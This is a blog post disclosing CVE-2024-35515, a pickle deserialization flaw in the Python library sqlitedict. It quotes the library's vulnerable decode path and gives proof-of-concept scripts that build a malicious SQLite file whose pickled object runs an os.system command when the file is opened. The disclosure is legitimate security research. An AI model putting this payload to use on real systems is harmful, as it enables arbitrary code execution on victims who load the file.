

* [Home](/)
* [About](/about/)
* [Writing](/archives/)
* [Search](/search/)
* [tags](/tags/)

Previous post
Next post
Back to top
Share post

1. [1. Before all](#Before-all)
2. [2. How I exploit it?](#How-I-exploit-it)
   1. [2.1. pickle insecure deserialization](#pickle-insecure-deserialization)
   2. [2.2. code review with sqlitedict](#code-review-with-sqlitedict)
3. [3. After all](#After-all)

# My First CVE! Exploiting sqlitedict (CVE-2024-35515)

William Lin

2024-06-13

[CVE](/tags/CVE/), [life](/tags/life/), [serialization](/tags/serialization/)

## Before all

**Impacted: sqlitedict <= 2.1.0**

> CVE-2024-35515

> This vulnerability might cause via code excution locally.

I found out this vulnerability on 2024/05/07 while I was dealing with my school scientific project, and just reported it to TWCERT(They also have a service for cve reporting) the next day but got rejected because they only dealing with CVE about Taiwanese products. And I also sync this issue on github(But I guess the author won’t patch this vuln QwQ)

After that, I reported the same stuffs to MITRE, and received their reply on 2024/5/29.

Anyway, though this is not a **BIG** 0-day report, but is definitely a thrilling exprience for me, and give me lots of motivation!

## How I exploit it?

### pickle insecure deserialization

In a python class object, a `__reduce__` method would be triggered with `pickle.loads`(deserialization) function.

So a malicious class dumped with pickle like this can cause via code excution when it loaded by `pickle.loads`.

| ``` 1234567891011 ``` | ``` # Exploitimport pickleclass Payload:    def __reduce__(self):        import os        return os.system, ('touch pwned.txt',)payload=pickle.dumps(Payload())# Victimpickle.loads(payload) ``` |
| --- | --- |

### code review with sqlitedict

<https://github.com/piskvorky/sqlitedict/blob/master/sqlitedict.py>

line 50~53
Importing dumps, loads function.

| ``` 1234 ``` | ``` try:    from cPickle import dumps, loads, HIGHEST_PROTOCOL as PICKLE_PROTOCOLexcept ImportError:    from pickle import dumps, loads, HIGHEST_PROTOCOL as PICKLE_PROTOCOL ``` |
| --- | --- |

line 120~127
The insecure encode/decode functions.

| ``` 12345678 ``` | ``` def encode(obj):    """Serialize an object using pickle to a binary format accepted by SQLite."""    return sqlite3.Binary(dumps(obj, protocol=PICKLE_PROTOCOL))def decode(obj):    """Deserialize objects retrieved from SQLite."""    return loads(bytes(obj)) ``` |
| --- | --- |

And finally, in class `SqliteDict`:

| ``` 123456 ``` | ``` def __getitem__(self, key):    GET_ITEM = 'SELECT value FROM "%s" WHERE key = ?' % self.tablename    item = self.conn.select_one(GET_ITEM, (self.encode_key(key),))    if item is None:        raise KeyError(key)    return self.decode(item[0]) ``` |
| --- | --- |

> the self.decode function is same as the previous decode function.

And the `__getitem__` method is called with an ‘aray-like’ identifying (for example : `arr[1]` is same as `arr.__getitem__(1)`)

So I can generate a malicious sqlite file including the previous code excution pickle payload.

**PoC\_generator.py**

| ``` 123456789101112131415161718 ``` | ``` from sqlitedict import SqliteDict, encode, decode, decode_keyimport pickleimport base64import osclass Payload:    def __init__(self, cmd):       self.cmd=cmd    def __reduce__(self):        import os        return os.system, (self.cmd,)payload = Payload('echo "pwned by whale120" > proof.txt')db = SqliteDict("example.sqlite")db["1"] = {"name":"whale120"}db["2"] = payloaddb.commit()db.close() ``` |
| --- | --- |

**PoC\_open\_sql.py**

| ``` 12345678 ``` | ``` from sqlitedict import SqliteDictdb=SqliteDict('example.sqlite')for key, item in db.items():    print("%s=%s" % (key, item))f=open('proof.txt', 'r')print('Content of proof.txt:')print(f.read()) ``` |
| --- | --- |

**Result:**

![image](https://hackmd.io/_uploads/Sy-a2QdrC.png)

## After all

owo?
![image](https://hackmd.io/_uploads/BkdC3I_B0.png)

* [Home](/)
* [About](/about/)
* [Writing](/archives/)
* [Search](/search/)
* [tags](/tags/)

1. [1. Before all](#Before-all)
2. [2. How I exploit it?](#How-I-exploit-it)
   1. [2.1. pickle insecure deserialization](#pickle-insecure-deserialization)
   2. [2.2. code review with sqlitedict](#code-review-with-sqlitedict)
3. [3. After all](#After-all)

Menu
TOC
Share
Top

Copyright ©
2023-2025
William Lin

* [Home](/)
* [About](/about/)
* [Writing](/archives/)
* [Search](/search/)
* [tags](/tags/)

